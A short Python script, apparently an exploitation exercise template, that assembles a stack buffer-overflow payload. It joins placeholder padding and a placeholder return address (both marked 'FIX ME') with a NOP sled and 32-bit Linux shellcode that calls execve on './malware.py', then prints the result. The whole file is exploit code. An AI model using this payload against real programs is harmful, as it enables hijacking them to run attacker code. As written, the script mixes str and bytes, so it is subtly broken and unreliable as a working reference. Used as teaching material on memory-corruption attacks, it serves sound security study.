#!/usr/bin/python

from struct import pack

new_ra=pack("<I",0xaabbccdd) # FIX ME
overflow=b"A"*10             # FIX ME

shellcode=b'\x31\xc0\x50\x68\x65\x2e\x70\x79\x68\x6c\x77\x61\x72\x68\x2e\x2f\x6d\x61\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'

nopsled="\x90"*128

payload=overflow+new_ra+nopsled+shellcode

print(payload)
